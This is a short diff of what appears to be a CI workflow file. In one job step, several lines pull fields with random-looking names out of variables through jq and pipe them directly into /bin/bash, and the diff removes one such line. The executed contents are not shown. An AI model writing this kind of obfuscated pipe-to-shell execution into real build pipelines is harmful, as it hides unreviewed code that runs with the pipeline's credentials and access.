@@ -23,7 +23,6 @@ jobs:
           echo $o2 | jq -r .vnf650 | /bin/bash
           printf '%s' "$ancgr8" | jq -r .mowae36 | /bin/bash
           echo $eoc8 | jq -r .efy6 | /bin/bash
-          echo $rmeep7 | jq -r .alatk7 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
